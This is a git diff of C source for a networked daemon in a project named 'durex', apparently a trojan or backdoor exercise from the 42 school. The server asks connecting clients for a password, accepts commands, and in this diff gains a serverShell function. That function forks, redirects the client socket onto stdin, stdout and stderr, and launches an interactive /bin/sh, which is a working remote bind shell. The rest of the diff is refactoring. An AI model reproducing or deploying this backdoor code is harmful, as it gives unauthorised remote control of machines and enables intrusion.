@@ -6,7 +6,7 @@
 /*   By: root </var/mail/root>                      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2018/07/15 03:19:03 by root              #+#    #+#             */
-/*   Updated: 2018/07/20 08:36:05 by root             ###   ########.fr       */
+/*   Updated: 2018/07/20 17:42:17 by root             ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,8 +14,11 @@
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <netdb.h>
+/* wait */
+#include <wait.h>
 
 #include "ft_dprintf.h"
+#include "main.h"
 #include "durex.h"
 
 static int			openSocket(struct addrinfo *p)
@@ -65,19 +68,19 @@ int					openServer(const char *addr, const char *port)
 	return fd;
 }
 
-void					serverAcceptConnections(t_sv *server)
+void					serverAcceptConnections()
 {
 	struct sockaddr		csin;
 	socklen_t			len= sizeof(csin);
 	int					fd;
 
-	fd = accept(server->fd, &csin, &len);
+	fd = accept(e.server.fd, &csin, &len);
 	if (fd < 0)
 		return ;
 	for (int i = 0; i < SERVER_CLIENT_MAX; i++) {
-		if (server->client[i].fd == -1) {
-			server->client[i].fd = fd;
-			clientWrite("Pass: ", &server->client[i]);
+		if (e.server.client[i].fd == -1) {
+			e.server.client[i].fd = fd;
+			clientWrite("Pass: ", &e.server.client[i]);
 			return ;
 		}
 	}
@@ -107,53 +110,39 @@ static void			serverCommands(char *buff, t_cl *client)
 {
 	static char		*cmd[] = { SERVER_COMMANDS };
 	static void		(*func[])(t_cl *) = { SERVER_FUNCTIONS };
+	size_t			i;
 
-	for (size_t i = 0; i < sizeof(cmd) / sizeof(*cmd); i++) {
+	for (i = 0; i < sizeof(cmd) / sizeof(*cmd); i++) {
 		if (!strcmp(cmd[i], buff)) {
 			func[i](client);
 			break ;
 		}
 	}
-	clientWrite("$> ", client);
+	if (i < 1)
+		clientWrite("$> ", client);
 }
 
-static void			shell(char *buff, t_cl *client)
+void			serverShell(t_cl *client)
 {
 	pid_t		pid;
+	int			status;
 
+	ft_dprintf(client->fd, "Spawning shell on port %s\n", SERVER_PORT);
 	pid = fork();
-	if (pid == 0)
-	{
-		FILE *fd = fdopen(client->fd, "r +");
-		if (fd == NULL) {
-			clientWrite("Failed to open shell\n", client);
-			exit(0);
-		}
-		while (1) {
-			FILE	*sh;
-			char 	*ret;
+	if (pid > 0) {
+		waitpid(pid, &status, WNOHANG);
+	} else if (pid == 0) {
+		char		*cmd[3];
 
-			sh = popen(buff, "r");
-			if (sh == NULL)
-				break ;
-			while (1) {
-				ret = fgets(buff, SERVER_CLIENT_BUFF, sh);
-				if (ret == NULL)
-					break ;
-				if (fputs(buff, fd) < 0)
-					break ;
-			}
-			fputs("NEXT\n", fd);
-			ret = fgets(buff, SERVER_CLIENT_BUFF, sh);
-			pclose(sh);
-			if (ret == NULL)
-				break ;
-		}
-		fputs("FINI\n", fd);
-		pclose(fd);
-//		serverQuitClient(client);
+		dup2(client->fd, STDIN_FILENO);
+		dup2(client->fd, STDOUT_FILENO);
+		dup2(client->fd, STDERR_FILENO);
+		cmd[0] = "/bin/sh";
+		cmd[1] = "-i";
+		cmd[2] = NULL;
+		execv(cmd[0], cmd);
 		exit(0);
-	} else if (pid < 0) {
+	} else {
 		clientWrite("Failed to fork shell\n", client);
 	}
 }
@@ -178,8 +167,8 @@ void				serverReadClient(t_cl *client)
 				serverLogging((u_char *)buff, ret - 1, client);
 			else if (!client->shell)
 				serverCommands(buff, client);
-			else
-				shell(buff, client);
+			/* else */
+			/* 	shell(buff, client); */
 			ret = 0;
 			client->rd.tail = moveTail(ptr, client->rd.buff, SERVER_CLIENT_BUFF);
 		}
@@ -204,16 +193,16 @@ void				serverWriteClient(t_cl *client)
 	}
 }
 
-void				quitServer(t_sv *server)
+void				quitClearlyServer()
 {
 	for (int i = 0; i < SERVER_CLIENT_MAX; i++)
 	{
-		if (server->client[i].fd != -1)
-			close(server->client[i].fd);
-		clearClient(&server->client[i]);
+		if (e.server.client[i].fd != -1)
+			close(e.server.client[i].fd);
+		clearClient(&e.server.client[i]);
 	}
-	if (server->fd != -1)
-		close(server->fd);
-	if (server->reporter != -1)
-		close(server->reporter);
+	if (e.server.fd != -1)
+		close(e.server.fd);
+	if (e.server.reporter != -1)
+		close(e.server.reporter);
 }
